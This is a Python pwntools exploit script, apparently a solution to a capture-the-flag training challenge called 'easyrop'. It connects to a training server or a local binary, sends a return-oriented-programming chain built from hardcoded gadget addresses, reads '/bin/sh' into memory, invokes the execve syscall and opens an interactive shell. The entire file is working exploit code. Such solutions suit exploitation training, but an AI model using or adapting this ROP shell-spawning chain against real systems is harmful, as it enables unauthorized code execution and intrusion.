from pwn import *
import time
import subprocess
import sys

def print_red(str):
	print("\033[91m" + str + "\033[0m")

def genbin(binary_name):
	command = f"genbin ~/challenges/playroom/shellcodes/{binary_name}"
	try:
		return bytes.fromhex(subprocess.check_output(command, shell=True, universal_newlines=True))
	except (subprocess.CalledProcessError, ValueError) as e:
		print(f"An exception occurred: {e}")
		exit(-1)

context.terminal = ['tmux', 'splitw', '-h']
#context.log_level = "error"


if args["REMOTE"]:
	r = remote("bin.training.offdef.it", 2015)
else:
	r = process("./easyrop")
	gdb.attach(r, """
	# b *0x00400290
	unset env
	c
	""")

def insert32(addr32):
    r.send(p32(addr32))
    time.sleep(0.2)
    r.send(p32(0x00))

def insert64(addr64):
    insert32(addr64 & 0x00000000FFFFFFFF)
    insert32((addr64 & 0xFFFFFFFF00000000) >> 32)



input("wait")
time.sleep(0.5)

for i in range(7):
    insert64(0x0000003100000041)

string_addr = 0x600400
read = 0x400144
pop_rdi_rsi_rdx_rax = 0x4001c2
syscall = 0x400168


insert64(pop_rdi_rsi_rdx_rax)
insert64(0x00)
insert64(string_addr)
insert64(0xa)
insert64(0x3b)
insert64(read)
insert64(pop_rdi_rsi_rdx_rax)
insert64(string_addr)
insert64(0x00)
insert64(0x00)
insert64(0x3b)
insert64(syscall)


r.send(b"\x00")
time.sleep(0.2)
r.send(b"\x00")

r.send(b"/bin/sh\x00")
time.sleep(0.2)
       
r.interactive()
